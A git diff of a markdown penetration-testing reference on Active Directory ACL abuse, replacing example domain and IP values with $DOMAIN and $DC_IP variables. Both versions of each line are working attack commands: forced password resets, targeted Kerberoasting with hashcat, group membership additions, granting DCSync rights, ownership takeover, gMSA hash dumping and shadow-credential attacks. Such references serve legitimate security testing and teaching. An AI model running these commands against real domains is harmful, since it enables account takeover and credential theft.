@@ -37,7 +37,7 @@ Set-DomainUserPassword -Identity target_user -AccountPassword $SecPass
 From Linux:
 
 ```bash
-net rpc password target_user 'NewPass123!' -U 'example.com/<attacker>%<pass>' -S 10.10.10.10
+net rpc password target_user 'NewPass123!' -U '$DOMAIN/<attacker>%<pass>' -S $DC_IP
 ```
 
 ### Targeted Kerberoasting (GenericWrite only)
@@ -49,7 +49,7 @@ Set-DomainObject -Identity target_user -Set @{serviceprincipalname='fake/spn'}
 ```
 
 ```bash
-impacket-GetUserSPNs example.com/<attacker>:<pass> -dc-ip 10.10.10.10 -request -outputfile tgs.hash
+impacket-GetUserSPNs $DOMAIN/<attacker>:<pass> -dc-ip $DC_IP -request -outputfile tgs.hash
 hashcat -m 13100 tgs.hash rockyou.txt
 ```
 
@@ -72,7 +72,7 @@ Add-DomainGroupMember -Identity "Target Group" -Members <attacker>
 From Linux:
 
 ```bash
-net rpc group addmem "Target Group" <attacker> -U 'example.com/<user>%<pass>' -S 10.10.10.10
+net rpc group addmem "Target Group" <attacker> -U '$DOMAIN/<user>%<pass>' -S $DC_IP
 ```
 
 ---
@@ -82,7 +82,7 @@ net rpc group addmem "Target Group" <attacker> -U 'example.com/<user>%<pass>' -S
 With `WriteDACL` on the root domain object, grant yourself replication rights:
 
 ```powershell
-Add-DomainObjectAcl -TargetIdentity "DC=example,DC=com" -PrincipalIdentity <attacker> -Rights DCSync
+Add-DomainObjectAcl -TargetIdentity "$BASE_DN" -PrincipalIdentity <attacker> -Rights DCSync
 ```
 
 Then run DCSync, see [DCSync](dcsync.md).
@@ -90,7 +90,7 @@ Then run DCSync, see [DCSync](dcsync.md).
 From Linux (`dacledit.py` from Impacket, recent versions):
 
 ```bash
-dacledit.py -action write -rights DCSync -principal <attacker> -target-dn 'DC=example,DC=com' example.com/<user>:'<pass>' -dc-ip 10.10.10.10
+dacledit.py -action write -rights DCSync -principal <attacker> -target-dn '$BASE_DN' $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP
 ```
 
 ---
@@ -107,8 +107,8 @@ Add-DomainObjectAcl -TargetIdentity target_user -PrincipalIdentity <attacker> -R
 From Linux:
 
 ```bash
-owneredit.py -action write -new-owner <attacker> -target target_user example.com/<user>:'<pass>' -dc-ip 10.10.10.10
-dacledit.py -action write -rights FullControl -principal <attacker> -target target_user example.com/<user>:'<pass>' -dc-ip 10.10.10.10
+owneredit.py -action write -new-owner <attacker> -target target_user $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP
+dacledit.py -action write -rights FullControl -principal <attacker> -target target_user $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP
 ```
 
 ---
@@ -128,10 +128,10 @@ Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureS
 Group Managed Service Accounts (gMSA) store their password in a special LDAP attribute. If your user or a group you're in has read access, retrieve and use the NTLM hash:
 
 ```bash
-nxc ldap 10.10.10.10 -u <user> -p '<pass>' --gmsa
+nxc ldap $DC_IP -u <user> -p '<pass>' --gmsa
 
 # Or with gMSADumper
-gMSADumper.py -u <user> -p '<pass>' -d example.com
+gMSADumper.py -u <user> -p '<pass>' -d $DOMAIN
 ```
 
 The returned NTLM hash can be used directly for pass-the-hash against services the gMSA controls.
@@ -145,20 +145,20 @@ Modern alternative to password reset, works when you have GenericWrite/GenericAl
 ### With pywhisker (Linux)
 
 ```bash
-pywhisker.py -d example.com -u <attacker> -p '<pass>' --target target_user --action add
+pywhisker.py -d $DOMAIN -u <attacker> -p '<pass>' --target target_user --action add
 ```
 
 This drops a `.pfx` file. Use it with PKINITtools:
 
 ```bash
-gettgtpkinit.py -cert-pfx target_user.pfx -pfx-pass '<pfx-password>' example.com/target_user target_user.ccache
+gettgtpkinit.py -cert-pfx target_user.pfx -pfx-pass '<pfx-password>' $DOMAIN/target_user target_user.ccache
 export KRB5CCNAME=target_user.ccache
 ```
 
 Then use the TGT to get the NT hash via U2U:
 
 ```bash
-getnthash.py -key <as-rep-key> example.com/target_user
+getnthash.py -key <as-rep-key> $DOMAIN/target_user
 ```
 
 ### With Whisker (Windows)
